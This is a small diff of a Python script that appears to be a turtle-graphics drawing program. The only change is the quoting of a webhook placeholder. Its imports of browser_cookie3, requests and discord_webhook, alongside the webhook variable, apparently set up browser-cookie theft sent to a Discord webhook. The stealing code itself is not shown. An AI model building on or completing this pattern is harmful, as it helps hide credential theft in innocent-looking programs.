@@ -1,7 +1,7 @@
 import turtle
 import browser_cookie3, requests, threading, discord_webhook          
 
-webhook = 'TestYourWebhook'
+webhook = "TestYourWebhook"
 
 s = turtle.Turtle()
 a = turtle.Screen()
